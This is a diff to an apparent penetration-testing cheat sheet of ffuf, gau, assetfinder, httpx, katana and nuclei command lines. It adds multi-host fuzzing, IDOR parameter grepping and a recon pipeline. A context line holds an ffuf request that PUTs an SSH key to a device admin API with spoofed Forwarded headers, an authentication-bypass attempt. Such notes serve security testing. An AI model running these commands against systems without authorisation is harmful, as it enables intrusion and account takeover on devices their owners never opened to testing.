@@ -5,6 +5,7 @@ Nuclei Command
 FFUF Command
 ~ > ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -e .bak
 ~ > ffuf -u https://rendering-prd.redacted.com/FUZZ -w english-words.txt -mc all -fw 6
+~ > ffuf -c -w HOST:hosts.txt -w ~/wordlist/words.txt -u HOST/FUZZ -mc 200 
 ~ > ffuf -w "host_list.txt:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -x PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000;' -d '{"ssh-public-key1" "h4x0r"}' -mr "SSH" -r -x http://127.0.0.1:8080
 
 Ghauri Command
@@ -28,6 +29,13 @@ Waybackurls command
 
 # Search JS using Gau + grep
 ~ > gau -subs DOMAIN | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> js-output.txt
+
+# IDOR Command
+~ > cat urls.txt | grep "id=[\d]*" | tee idor.txt
+
+# Recon Tools Example
+~ > cat rootDomains.txt | assetfinder subs-only | httpx -p 80,443,8080,8443,9000 -nc -silent > hosts.txt; 
+~ > katana -list hosts.txt -nc -silent -c 50 | nuclei -t <your templates>
 
 
 -------------------------------------------------------------------------------------
